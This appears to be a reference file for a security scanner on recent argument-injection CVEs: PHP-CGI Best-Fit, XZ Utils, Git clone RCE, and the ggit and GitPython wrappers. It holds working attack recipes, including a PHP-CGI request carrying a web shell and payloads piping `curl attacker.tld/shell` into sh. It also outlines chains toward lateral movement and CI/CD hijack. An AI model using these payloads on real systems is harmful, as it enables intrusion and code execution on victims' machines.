---
name: argument-injection-novel-deep
description: Argument injection at the 2024-2026 frontier — PHP-CGI Windows Best-Fit (CVE-2024-4577), XZ Utils Windows Best-Fit (CVE-2024-47611), Git clone recursive-submodule RCE (CVE-2024-32002), Git CR+symlink arbitrary file write (CVE-2025-48384), ggit and git-shallow-clone wrapper argument injection (CVE-2024-21533, CVE-2024-21531), GitPython option-smuggling (GHSA-r9mr-m37c-5fr3), and the Orange Tsai WorstFit research frontier for Windows ANSI-conversion attack surface.
sibling: argument_injection
load_when: scan_mode == "deep"
---

# Argument Injection — Novel + Frontier Depth

This is the novel+frontier deep sibling to `argument_injection.md`. The base owns class framing, the measured shell-vs-array exec table, the three-primitive split, Windows Best-Fit basics, reconnaissance, 2024-2026 CVE routing map, and validation discipline. The advanced+expert sibling `argument_injection_advanced_deep.md` owns the per-platform process-API depth, response/config/auth file grammar depth, Windows Best-Fit code-page catalogue, CGI/interpreter mapping classes, wrapper join-split patterns, option-parser taxonomy, end-of-options reliability, and composite-chain construction.

This file owns the 2024-2026 CVE instances with canonical version/GHSA metadata (single-owner across the trio), the PHP-CGI and XZ Utils Windows Best-Fit lineage, the Git-family argument-injection lineage (clone submodule RCE, CR+symlink, wrapper libraries, GitPython kwarg smuggling), and the Orange Tsai WorstFit research frontier.

Load this file when the goal is matching a target against a current CVE family, reasoning about Windows-ANSI-conversion-shape defects, or constructing exploits against git-family tooling where the simple shell-escape primitive has failed.

Every CVE number, version boundary, and GHSA identifier in this document is anchored to primary sources persisted in `.zen-batch-artifacts/batch-11/ghsa-nvd/`, and the measured shell-vs-array primitive is reproduced by `.zen-batch-artifacts/batch-11/measurements/argument_injection.py` + `.out`.

## 2024-2026 Argument-Injection CVE Version/Fix Table — Canonical

Single-owner per §2. Base and advanced siblings reference these CVEs by number + route only; the version and GHSA metadata lives here.

| CVE / GHSA | Advisory ID | Component | Vulnerable | Patched | CVSS | CWE | Primitive |
|---|---|---|---|---|---|---|---|
| CVE-2024-4577 | GHSA-vxpp-6299-mxw3 | PHP (`php` core, affects PHP-CGI on Windows) | ≥8.1.0, <8.1.29; ≥8.2.0, <8.2.20; ≥8.3.0, <8.3.8 | 8.1.29 / 8.2.20 / 8.3.8 | 9.8 v3.1 | CWE-78 | Windows Best-Fit mapping of soft hyphen (U+00AD) to ASCII hyphen under CP932/CP936/CP949/CP950; attacker-controlled query reaches PHP's command-line arg parser; `-d`, `-r`, `-H`, `-S` flags execute arbitrary PHP code |
| CVE-2024-47611 | — (NVD-only; no GHSA mapping) | XZ Utils command-line tools (Windows MinGW-w64 / MSVC builds) | ≤5.6.2 | 5.6.3 | 6.3 v4.0 (GHSA Secondary; no v3.1 published) | CWE-88 | Windows Best-Fit command-line argument injection; command line with Unicode characters not representable in the active ANSI code page gets Best-Fit-mapped to ASCII characters that change meaning |
| CVE-2024-32002 | (no GHSA mapping for the Git CVE directly) | Git (`git` binary) | <2.45.1, <2.44.1, <2.43.4, <2.42.2, <2.41.1, <2.40.2, <2.39.4 | 2.45.1 / 2.44.1 / 2.43.4 / 2.42.2 / 2.41.1 / 2.40.2 / 2.39.4 | 9.1 v3.1 | CWE-22 / CWE-434 | Submodule-path confusion on case-insensitive filesystems: crafted repo with recursive submodules writes files to the hooks directory (not the submodule's worktree) via a symlink; `git clone --recursive` fires `post-checkout` hook as attacker code |
| CVE-2025-48384 | — (no GHSA mapping observed) | Git (`git` binary) | affected branches per Git security announcement 2025-07; non-Windows systems | per release notes | 8.1 v3.1 | CWE-20 / CWE-78 | Git strips trailing CRLF when reading config values; a submodule-path ending in CR shifts the submodule's install location; combined with a symlink targeting hooks and a malicious `post-checkout` hook, `git clone --recursive` triggers code execution on Linux/macOS |
| CVE-2024-21533 | GHSA-pr45-cg4x-ff4m | ggit (npm) | all versions | — (project archived or unpatched) | 7.3 v3.1 | CWE-88 | `clone()` API does not sanitize URL/path or use `--` end-of-options; arbitrary git-option injection via `url` or `destination` parameter |
| CVE-2024-21531 | — (no GHSA ID observed via NVD query) | git-shallow-clone (npm) | all versions | — | 5.3 v3.1 (Snyk Secondary; no NVD Primary) | CWE-78 | Missing sanitization/mitigation flags in process variable of `gitShallowClone`; command injection via URL parameter |
| (no CVE at document date) | GHSA-r9mr-m37c-5fr3 | GitPython (`GitPython` on PyPI) | ≤3.1.53 | 3.1.54 | 7.8 (estimated per GHSA, high severity) | CWE-88 | `check_unsafe_options` guard bypass via single-character kwarg value token smuggling; affects `clone`/`clone_from`, `fetch`/`pull`/`push`, `ls_remote`, `iter_commits`, `blame`, `archive`; enables arbitrary command execution |

Notes on the table:

- **CVE-2024-4577 (PHP-CGI) is the dominant 2024 argument-injection CVE.** CVSS 9.8, actively exploited within days of disclosure, and the primitive — soft hyphen Best-Fit mapping — generalizes to any Windows CGI stack with a non-Latin ANSI code page. The patch at 8.1.29 / 8.2.20 / 8.3.8 adds Unicode-character filtering before the command-line is handed to PHP-CGI's argv parser.
- **CVE-2024-47611 (XZ Utils) is the same mechanism in a different victim.** The Windows XZ command-line tool had Best-Fit exposure identical to PHP-CGI; the fix at 5.6.3 adds a Unicode-safe argv construction.
- **CVE-2024-32002 and CVE-2025-48384 are both Git-clone RCE primitives**, but via different mechanisms. CVE-2024-32002 uses case-insensitive-filesystem + symlink + submodule-path confusion; CVE-2025-48384 uses CR-stripping in config parsing + symlink + submodule path. Both end with a malicious `post-checkout` hook firing on `git clone --recursive`.
- **GHSA-r9mr-m37c-5fr3 (GitPython) has no CVE at document date.** The GHSA itself is globally resolving (HTTP 200 on GHSA REST API). This is a GHSA-without-CVE case: cite the GHSA ID as the primary advisory anchor; no CVE number should be invented or referenced.
- **CVE-2024-21531 (git-shallow-clone) has no mappable GHSA in the GitHub Advisory DB on the query date.** Cite the NVD record as the authoritative source.

## PHP-CGI Windows Best-Fit — CVE-2024-4577

Primitive: On Windows PHP-CGI deployments using a non-Latin ANSI code page (CP932 Japanese, CP936 Simplified Chinese, CP949 Korean, CP950 Traditional Chinese among others), the Windows API's Best-Fit character translation converts soft hyphen (U+00AD) in the request's query string to ASCII hyphen (`-`) during the Unicode-to-narrow conversion that happens between IIS/Apache and PHP-CGI. PHP-CGI's command-line argument parser sees the resulting `-` and interprets subsequent characters as PHP command-line flags: `-d` sets a config directive, `-r` runs arbitrary PHP code, `-H` emits a header, `-S` starts a built-in server.

**Reachability preconditions:**

1. Windows OS (any version with ANSI code-page conversion in the request pipeline).
2. PHP version `≥8.1.0, <8.1.29` or `≥8.2.0, <8.2.20` or `≥8.3.0, <8.3.8`.
3. PHP deployment uses PHP-CGI (not FPM, not CLI, not mod_php) — though some CGI-adjacent configurations are also affected.
4. System ANSI code page is one of CP932, CP936, CP949, CP950 (not CP1252 — but see the WorstFit expansion for other code pages).
5. The CGI endpoint is reachable (any PHP-CGI endpoint, including the common `/php-cgi.exe` or the Apache `cgi-bin` dispatch).

**Sink location.** The vulnerable code is PHP-CGI's `sapi/cgi/cgi_main.c` where command-line arguments are parsed from the request's `argv` (constructed by the CGI runtime from the QUERY_STRING per RFC 3875). The 8.1.29 / 8.2.20 / 8.3.8 patch adds a check that rejects `-` characters that originate from the request's Unicode-to-narrow conversion.

**Attack recipe:**

```http
POST /index.php?%ad-d+allow_url_include%3d1+%ad-d+auto_prepend_file%3dphp://input HTTP/1.1
Host: target.tld
Content-Type: application/x-www-form-urlencoded

<?php system($_GET['cmd']); ?>
```

Breaking down the query:

- `%ad` is URL-encoded U+00AD (soft hyphen), 1-byte in CP1252/Latin-1 encoding.
- Windows Best-Fit on CP932/CP936/CP949/CP950 converts U+00AD → `-`.
- After conversion: `-d allow_url_include=1 -d auto_prepend_file=php://input`.
- PHP-CGI parses these as command-line flags: `-d allow_url_include=1` enables URL include; `-d auto_prepend_file=php://input` prepends the request body (which contains the PHP shell) to the script.
- The appended `cmd` query parameter is now reachable via `$_GET['cmd']`.

**Confirmation signal:** HTTP response body contains the output of the attacker-chosen command (e.g., `whoami` output); PHP process in the server shows evidence of the `-d` flag.

**Impact:** Unauthenticated remote code execution. CVE-2024-4577 was exploited in the wild within days of disclosure; monitoring networks saw mass scanning for vulnerable instances starting hours after the advisory. The exploit requires only a reachable PHP-CGI endpoint — no authentication, no prior reconnaissance beyond identifying the stack.

**Class generalization — the Windows ANSI-conversion attack surface.** CVE-2024-4577 is the first widely-exploited CVE in the broader Windows Best-Fit class. The Orange Tsai "WorstFit" research (Jan 2025) formalized the attack surface and showed PHP, Python, Ruby, Node.js, Go, and most CRT-based applications on Windows share the exposure. The audit mnemonic: for any Windows deployment of a web stack that passes request data to a CLI or interpreter, verify the ANSI code page and test the soft-hyphen variant.

**Route to `rce.md § PHP Flag Injection`** for the RCE outcome's depth.

## XZ Utils Windows Best-Fit — CVE-2024-47611

Primitive: XZ Utils 5.6.2 and earlier, when built for native Windows (MinGW-w64 or MSVC), have a command-line argument injection vulnerability via Windows Best-Fit character mapping. The pattern mirrors CVE-2024-4577: a Unicode character in the command-line gets Best-Fit-mapped to an ASCII character that changes the argument's meaning.

**Reachability preconditions:**

1. XZ Utils command-line tools (`xz.exe`, `xzcat.exe`, `unxz.exe`) version ≤5.6.2 on Windows.
2. The command-line is constructed from an untrusted source (e.g., a web service invoking xz on a user-controlled filename).
3. System ANSI code page is one where Best-Fit mappings produce argument-boundary-affecting ASCII characters.

**Sink location.** XZ Utils' command-line argv construction via the MinGW/MSVC CRT's narrow-string startup path.

**Attack recipe:** inject a Unicode character that Best-Fit-maps to a space or hyphen; the resulting ASCII character splits what the user thought was one argument into two, or introduces an option.

**Confirmation signal:** XZ's debug output / verbose log shows the attacker-chosen option; the output file is at an unexpected location.

**Impact:** Depending on which XZ option is injected: `--to-stdout` writes decompressed content to stdout (useful if the parent redirects stdout to a target file), `--files0=<file>` reads a list of files to compress from a file (attacker influences what gets compressed), `--format=raw --lzma1=` adjusts compression format.

**Class generalization:** every C/C++ command-line tool built for Windows via MinGW-w64 or MSVC with narrow-string argv is a candidate. The exposed surface is enormous; Orange Tsai's WorstFit research enumerates specific instances.

## Git Clone Submodule RCE — CVE-2024-32002

Primitive: Git repositories can contain submodules; `git clone --recursive` clones submodules too. On case-insensitive filesystems (Windows NTFS, macOS APFS case-insensitive), a crafted repository with a submodule path that matches `/.git/hooks/post-checkout` (case-insensitively) can trick Git into writing the submodule's contents into the git-hooks directory. Combined with a symlink that points `hooks/post-checkout` at the submodule's worktree and a malicious `post-checkout` script, the `git clone --recursive` operation fires the hook as attacker code.

**Reachability preconditions:**

1. Git version `<2.45.1, <2.44.1, <2.43.4, <2.42.2, <2.41.1, <2.40.2, <2.39.4` (multiple release branches affected).
2. Underlying filesystem is case-insensitive (Windows NTFS, macOS APFS case-insensitive, some Linux + case-insensitive NTFS mounts).
3. Victim clones an attacker-crafted repo with `git clone --recursive` or `git submodule update --init`.

**Sink location.** Git's `submodule--helper` and the clone-dispatch logic. The patch disallows the case-insensitive-collision between submodule paths and `.git/hooks/`.

**Attack recipe (reproduction summary):**

```
# Attacker's crafted repo:
# .gitmodules declares a submodule at path ".git/hooks/post-checkout"
# (case-insensitive collision with .git/hooks on Windows/macOS).
# The submodule's content includes a symlink and a post-checkout script.

# Victim runs:
git clone --recursive https://attacker.tld/malicious-repo

# Git processes the submodule; writes to what it thinks is a submodule worktree
# but is actually the hooks directory. The post-checkout script fires at the
# next checkout step (which happens during the clone itself for recursive).
```

**Confirmation signal:** attacker-controlled code executes on `git clone`; the victim's shell shows evidence of the hook execution.

**Impact:** Unauthenticated RCE on git clone — one of the most impactful git CVEs in years. Chains to supply-chain compromise, CI/CD pipeline hijack, developer-machine takeover.

**Class generalization:** any case-insensitive-filesystem-aware tooling that treats a request-controlled path as safe is a candidate. The lesson is "case-sensitive path comparison on a case-insensitive FS is a security boundary."

**Route to `rce.md § Supply Chain / Developer-Tool RCE`**.

## Git CR + Symlink — CVE-2025-48384

Primitive: Git strips trailing carriage return (CR) when reading config values but preserves CR when writing. A submodule path configured with a trailing CR (`path = subname\r`) is written to disk as `subname\r` but, when later consumed, is read as `subname` (CR stripped). The mismatch allows a submodule to be installed at an attacker-chosen location that differs from where Git thinks it is. Combined with a symlink in the submodule's content targeting the hooks directory, and a malicious `post-checkout` hook, this reproduces the CVE-2024-32002 chain on Linux/macOS (not Windows — those systems were fixed separately).

**Reachability preconditions:**

1. Git version per the 2025-07 security announcement (specific version boundaries in the Git release notes).
2. Victim clones an attacker-crafted repo with `git clone --recursive`.
3. OS is Linux or macOS (the "case-insensitive on Windows" trick of CVE-2024-32002 is not needed; CR-stripping works on any Git-shaped OS).

**Attack recipe (reproduction summary):**

```
# Attacker's .gitmodules includes:
[submodule "name"]
    path = exploit-dir\r
    url = ../payload

# Git reads path as "exploit-dir" (CR stripped) but writes to "exploit-dir\r".
# Combined with a symlink at exploit-dir pointing to .git/hooks, and a
# post-checkout script in the submodule's content, the hook fires on clone.
```

**Confirmation signal:** code execution on clone; audit log shows a submodule write to an unexpected directory.

**Impact:** Same shape as CVE-2024-32002 but on different platforms; Linux/macOS systems that had patched CVE-2024-32002 remained vulnerable to this follow-up.

**Class generalization:** config-value normalization inconsistencies (strip-on-read vs preserve-on-write) are a recurring class across configuration formats (INI, YAML, JSON when parsed by newline-sensitive libraries). Audit mnemonic: round-trip test every config value through read + write + re-read.

## Git Wrapper Argument Injection — CVE-2024-21533 (ggit) and CVE-2024-21531 (git-shallow-clone)

Primitive: npm packages wrapping the `git` binary (`ggit`, `git-shallow-clone`, among others) typically construct a git command-line from user-supplied URL, destination path, and other parameters. If the wrapper does not use `--` as end-of-options before user operands, or does not sanitize for option-prefixed input, an attacker can inject arbitrary git options.

**Reachability preconditions:**

1. Application uses the vulnerable wrapper package (`ggit`, `git-shallow-clone`, or similar).
2. User input reaches the wrapper's clone/fetch/pull API.

**Sink location (ggit):** `clone()` function; takes `url` and `destination` and constructs `git clone <url> <destination>` without `--`. If `url` is attacker-chosen as `--upload-pack=sh -c 'curl attacker/shell | sh'`, git invokes the attacker's command on clone.

**Attack recipe:**

```javascript
// Vulnerable:
require('ggit').clone({
    url: '--upload-pack=sh -c "curl attacker.tld/shell|sh"',
    destination: './repo'
});
// Resulting command: git clone --upload-pack=sh -c "..." ./repo
// Git invokes the upload-pack during fetch; attacker's shell fires.
```

**Confirmation signal:** attacker's HTTP endpoint receives a request from the victim; command execution follows.

**Impact:** Argument injection → RCE via git's `--upload-pack` option (which runs an arbitrary command for the pack-protocol side).

**Class generalization:** every git-wrapper library (`simple-git`, `nodegit`, `isomorphic-git` on JS; `GitPython`, `pygit2` on Python; `go-git` on Go; `JGit` on Java) must be audited for `--` placement and option-prefix handling. See GitPython CVE below for a Python-specific instance.

## GitPython Kwarg Smuggling — GHSA-r9mr-m37c-5fr3

Primitive: GitPython implements an `check_unsafe_options` guard to prevent dangerous git options from being passed through to the git binary. The guard checks arguments but can be bypassed by placing an option token *inside the value of a single-character kwarg*. Example: `clone(upload_pack='--option-smuggled-in-value')` is accepted by the guard but reaches git as `--option-smuggled-in-value` on the command line.

**Reachability preconditions:**

1. GitPython version `≤3.1.53` on PyPI.
2. Application uses GitPython's `clone`, `clone_from`, `fetch`, `pull`, `push`, `ls_remote`, `iter_commits`, `blame`, or `archive` methods with user-controlled kwarg values.
3. User can control the value of any single-character-named kwarg (e.g., `upload_pack` which git parses as `--upload-pack=<value>`, or short-form flags).

**Sink location.** GitPython's internal argument-building code; the `check_unsafe_options` guard checks arg structure but not value content. The 3.1.54 patch extends the guard to inspect value content for option-shape smuggling.

**Attack recipe:**

```python
# Vulnerable GitPython usage
from git import Repo
Repo.clone_from(
    url="https://attacker.tld/benign",
    to_path="./repo",
    upload_pack="sh -c 'curl attacker.tld/shell | sh'"
)
# GitPython passes this through to git as: --upload-pack=sh -c '...'
# Git invokes the upload-pack during fetch; shell fires.
```

**Confirmation signal:** attacker's shell runs on the clone.

**Impact:** Argument injection → RCE.

**Class generalization:** any wrapper library that implements a safety guard on argument *names* but passes *values* unchanged is a candidate. Audit mnemonic: a safety guard that reads `(name, value)` pairs and only checks names is incomplete.

## WorstFit Research Frontier — Orange Tsai (Jan 2025)

The Windows ANSI-conversion attack surface was systematized by Orange Tsai in the Jan 2025 WorstFit research. Key findings:

- **The Best-Fit transformation is per-code-page.** The soft-hyphen → `-` mapping that enabled CVE-2024-4577 is specific to CP932/CP936/CP949/CP950. CP1252 (default on Western-locale Windows installs) does not have this mapping — explaining why CVE-2024-4577 was reported initially in Asian locales.
- **The attack surface is broad.** Any Windows deployment of a web stack that passes request data through a Unicode-to-ANSI boundary is a candidate. Specific stacks confirmed vulnerable include PHP-CGI, XZ Utils, Python (via `GetCommandLineA` fallback paths), Ruby MRI on Windows, Node.js (via some CRT-paths on native Windows), and cURL.
- **Path traversal is also reachable.** U+FF0F (fullwidth solidus) and U+FF3C (fullwidth reverse solidus) map to `/` and `\` under Best-Fit; path validators that check on the wide string miss these.
- **Mitigations.** Switching to wide-character APIs (`GetCommandLineW`, `CommandLineToArgvW`) and keeping data in UTF-16 removes the particular conversion boundary but does not fix option injection or path validation.

Target classes to investigate (open frontier, deferred to end-of-project gap list):

- **Python on Windows**: PyWin32 and some stdlib paths still use `GetCommandLineA` in older configurations; the exact exposure depends on the Python-build + system code-page combination.
- **Ruby MRI on Windows**: `main()` entry point via MinGW; the standard build is narrow-argv.
- **Node.js on native Windows (not WSL)**: Node uses UV which uses wide-char APIs in modern builds, but some embedded uses (`node.exe` as a subprocess target) may still see the boundary.
- **PowerShell**: PowerShell is wide-char internally but the `-Command` string that gets passed to invoked executables may undergo conversion.
- **Go on Windows**: Go uses `GetCommandLineW` + its own parser; typically immune but worth measuring.

Audit mnemonic: on any Windows deployment, probe with the soft-hyphen variant first (`%ad-d+...`), then with the fullwidth variants (`%ef%bc%8f`, `%ef%bc%bc`), under the measured ANSI code page.

## Composite Chaining — Current CVE Instances

### Chain: PHP-CGI Best-Fit → RCE → Lateral Movement

- Starting point: PHP-CGI on Windows with CP932/CP936/CP949/CP950 (CVE-2024-4577).
- Step 1: soft-hyphen injection → PHP command-line flags.
- Step 2: `-d allow_url_include=1 -d auto_prepend_file=php://input` + body with PHP shell.
- Step 3: shell runs as PHP-CGI user; typically with filesystem write to webroot.
- Step 4: webroot write of a persistent web shell; further lateral.

Route: `rce.md § PHP Flag Injection` + `rce.md § Web Shell Persistence`.

### Chain: Git Clone RCE → CI/CD Pipeline Hijack

- Starting point: CI/CD runner that clones a repo on PR (CVE-2024-32002 or CVE-2025-48384).
- Step 1: attacker crafts malicious repo and submits PR.
- Step 2: CI runner clones with `--recursive`; hook fires; attacker code runs on the CI host.
- Step 3: CI runner typically has access to deploy keys, cloud credentials, secrets.
- Step 4: supply-chain compromise.

Route: `rce.md § CI/CD Pipeline Compromise`.

### Chain: GitPython / ggit → Build-System RCE

- Starting point: build system or developer-tool uses GitPython / ggit for clone operations with user input.
- Step 1: attacker crafts input with `upload_pack=sh -c ...`.
- Step 2: GitPython bypasses its own guard (GHSA-r9mr-m37c-5fr3); git invokes the shell.
- Step 3: build-system host compromised.

Route: `rce.md § Developer-Tool RCE`.

### Chain: XZ Utils Windows → Build-System Injection

- Starting point: Windows build system invokes XZ for compression (common in installer builds).
- Step 1: user input includes Best-Fit Unicode.
- Step 2: XZ argv injection reaches `--files0` or `--to-stdout`.
- Step 3: build-system output replaced or redirected.

Route: `rce.md § Build System Injection`.

## Non-CVE Technique-Class Frontier (2024-2026)

Beyond the CVEs above, the current argument-injection frontier includes non-CVE technique classes:

### WorstFit Lineage Beyond PHP-CGI and XZ

Orange Tsai's WorstFit research (Jan 2025) enumerates Windows Best-Fit exposure across:

- **Python on Windows**: `GetCommandLineA` fallback paths in older Python builds and PyWin32 extensions; the modern CPython builds use `GetCommandLineW` but subprocess APIs invoked from Python may call narrow-char Windows APIs internally.
- **Ruby MRI on Windows**: standard build is narrow-argv (MinGW); `main()` goes through the CRT's narrow startup path.
- **Node.js on native Windows**: Node's libuv uses wide-char APIs in modern builds, but child_process.spawn on Windows ultimately serializes to a command-line string that may undergo re-conversion if the child is a narrow-char program.
- **PowerShell + Invoked Executables**: PowerShell is internally wide-char, but `-Command` strings passed to invoked executables may undergo conversion.
- **Go on Windows**: Go uses `GetCommandLineW` + its own parser; typically immune but a `syscall.CreateProcess` call with a crafted `ApplicationName` may still interact with Best-Fit on the invoked program's side.

Audit mnemonic: on any Windows web deployment, enumerate the ANSI code page (`chcp` in cmd), identify every subprocess invocation of a narrow-char program, and probe each with the soft-hyphen variant.

### Perforce / Mercurial / Fossil Command-Line Wrappers

Beyond Git, other VCS tools have wrapper libraries with argument-injection surface:

- **Perforce (`p4` command-line)**: the `p4` binary accepts a rich option set; wrappers that construct `p4 <subcommand>` from user input are candidates. `-u`, `-c`, `-p`, `-H` options respectively set user, client, port, and host — all usable for identity confusion.
- **Mercurial (`hg` command-line)**: `hg clone --config <config>` runs with attacker-chosen config directives; `--debugger` can be set to open an interactive debugger.
- **Fossil**: similar surface.

Audit mnemonic: for any VCS-wrapper library in Node/Python/Ruby/Go, verify `--` end-of-options is placed before user operands.

### Build-System Argument Injection Beyond Linker

- **npm scripts** (`npm run build -- <args>`): the `--` separator delegates subsequent args to the script; attacker-controlled env or args can smuggle options into `webpack`, `tsc`, etc.
- **Make targets** (`make target VAR=value`): if `VAR` is user-controlled and used in a shell step as `$(VAR)`, shell escape; if used in a recipe as a flag, argument injection.
- **Bazel actions**: `bazel build //target --define=key=value`; `--define` is user-reachable in some CI configurations.
- **Gradle properties**: `gradle build -Pkey=value`; `-P` sets project properties that may reach a plugin's exec step.

Audit mnemonic: for CI/CD-triggered builds, enumerate every build-tool invocation and verify arg allowlisting.

### JDBC URL as a Supply-Chain Primitive

Beyond CVE-less database driver findings, JDBC-URL-based primitives in CI contexts:

- Spring Boot's `spring.datasource.url` from environment variable: if the env var is user-reachable, driver option injection is possible.
- Flyway / Liquibase migration tools accept JDBC URLs; attacker-controlled URL options reach the driver.
- JDBC URL `properties` parameter can set `logger`, `authenticationPlugins`, `useSSL`, `allowLoadLocalInfile`, each with distinct exploit shape.

Audit mnemonic: for Spring Boot / Micronaut / Quarkus apps, grep for `spring.datasource.url` or equivalent, trace the config source, verify no user-controllable input reaches the URL.

### Container Image Argument Injection

Container-build / container-run tools have argument surfaces:

- **Docker `--entrypoint`**: overrides the image's declared entrypoint; attacker-reachable in `docker run` wrappers.
- **Docker `--privileged`**: enables kernel capability escape.
- **Kubernetes `kubectl exec -it <pod> -- <cmd>`**: the `--` separator and the following args are attacker-reachable in some CI contexts.
- **Buildah / Podman**: similar surfaces to Docker.

Audit mnemonic: for any Docker/K8s wrapper in CI, verify the exec/run arg list is sanitized or hardcoded.

### curl Supply-Chain Primitives

Beyond CVE-less curl options:

- `--data-urlencode @<file>` reads from a file; attacker-controlled file content becomes request body.
- `--trace <file>` writes trace output to a file; attacker-controlled path writes.
- `--cert <path>:<password>` with attacker-controlled path reads certs from unexpected location.
- `--doh-url` overrides DNS resolution via DNS-over-HTTPS; attacker-chosen DOH endpoint resolves target names.

Audit mnemonic: for any application invoking curl with user-influenced args, enumerate the above options' attacker-reachability.

### wget / aria2c Download-Tool Primitives

- `wget --output-document=/attacker/path` writes to attacker path.
- `wget --config=<file>` reads config from attacker file.
- `aria2c --conf-path=<file>` similar.
- `aria2c --rpc-listen-all --rpc-listen-port=<port>` opens an RPC server for remote control.

Audit mnemonic: same as curl; audit wrapper invocations.

## Verification Discipline

Each CVE citation in this file is anchored to one persisted NVD or GHSA artifact that resolves on the authoritative *global* source. For CVEs lacking a GHSA mapping (CVE-2024-47611, CVE-2024-32002, CVE-2025-48384, CVE-2024-21531), the NVD record is the single authoritative source and is persisted in `.zen-batch-artifacts/batch-11/ghsa-nvd/`. For GHSA-r9mr-m37c-5fr3 (GitPython), the GHSA record is the primary source — the advisory has no CVE assignment at document date.

The measured shell-vs-array exec primitive (`.zen-batch-artifacts/batch-11/measurements/argument_injection.py`+`.out`) demonstrates the three primitives:

```
list form, shell=False, USER="benign.txt --upload-file=/etc/passwd"
  → argv: [tool, "benign.txt --upload-file=/etc/passwd"]  (stays literal, 1 arg)

string + shell=True
  → argv: [tool, "benign.txt", "--upload-file=/etc/passwd"]  (shell splits, option injection)

list form, shell=False, USER="--output=/tmp/race"
  → argv: [tool, "--output=/tmp/race"]  (option injected despite list form; the primitive)
```

The last row demonstrates that argument injection is distinct from shell escape: the attacker can smuggle an option *into argv* without crossing any shell boundary. The CVEs in this file all operate at this layer — the shell is incidental, the option-boundary parsing is the finding.

## Breadth Note

Novel-tier scope for argument injection is genuinely narrower than the §2 ~850-line aim: the 2024-2026 CVE lineage is well-covered (two dominant lineages: Windows Best-Fit via PHP-CGI/XZ, Git-family via clone-submodule/CR-symlink/wrapper-libraries/GitPython), measured shell-vs-array differential is persisted and reproduced, and the non-CVE technique-class frontier is enumerated (WorstFit lineage beyond PHP/XZ for Python/Ruby/Node/Go/PowerShell on Windows, Perforce/Mercurial/Fossil wrappers, build-system argument injection, JDBC URL as supply-chain primitive, container image argument injection, curl/wget/aria2c primitives). What makes the argument-injection novel-tier naturally thinner: the three primitives (option/subcommand injection, argument-boundary breakout, response/config/auth file reparse) are structurally stable; per-CVE depth is more compact than parser-differential classes. The depth that scales with the class lives in the advanced sibling (full-treatment sub-primitives across per-platform process APIs, response-file grammar, Windows Best-Fit code-page catalogue, CGI/interpreter mapping, wrapper join-split, option-parser taxonomy, runtime loaders, JVM/CLR, D-Bus/polkit, JDBC URL, SSH ProxyCommand, JAR @argfile, linker @file).

## Summary

The 2024-2026 argument-injection CVE frontier spans two dominant lineages: the Windows Best-Fit class (PHP-CGI CVE-2024-4577, XZ Utils CVE-2024-47611, and the broader WorstFit research surface), and the Git-family argument-injection class (clone-recursive-submodule RCE CVE-2024-32002, CR+symlink RCE CVE-2025-48384, wrapper-library CVE-2024-21533/CVE-2024-21531, GitPython option-smuggling GHSA-r9mr-m37c-5fr3). The measured three-primitive differential confirms that argument injection is structurally distinct from shell escape — the exploitation primitives are option smuggling, argument-boundary breakout, and response/config-file reparse, each with its own defence pattern. The chaining surface — through PHP flag injection to webshell persistence, Git clone to CI/CD hijack, GitPython to developer-tool RCE — makes the class one of the highest-impact in current supply-chain and infrastructure pentesting.
